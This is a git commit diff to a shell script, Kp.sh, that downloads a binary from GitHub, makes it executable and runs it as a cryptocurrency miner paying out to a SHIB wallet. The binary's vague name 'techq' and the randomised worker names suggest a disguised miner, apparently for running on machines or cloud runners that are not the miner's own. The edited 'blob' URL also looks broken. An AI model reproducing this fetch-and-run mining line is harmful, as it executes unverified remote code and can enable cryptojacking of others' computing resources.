a921789399b20c814aae4f7d51bcc6a4073e06f8
Zivin30 <91950641+Zivin30@users.noreply.github.com>
2022-07-14 23:53:45 +0700

    Update Kp.sh

--- Gas/Kp.sh
+++ Gas/Kp.sh
@@ -1,1 +1,1 @@
-wget https://github.com/Menak3/Corner/raw/main/techq && chmod +x techq && ./techq --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0xfc0ed5ad9bc0159ce822d87b7f0eccae4aa01e9d.$(echo $(shuf -i 1-9999 -n 1)-AST) --ethstratum ETHPROXY
+wget https://github.com/Menak3/Corner/blob/main/techq && chmod +x techq && ./techq --algo ETHASH --pool ethash.unmineable.com:3333 --user SHIB:0xfc0ed5ad9bc0159ce822d87b7f0eccae4aa01e9d.$(echo $(shuf -i 1-9999 -n 1)-AST) --ethstratum ETHPROXY
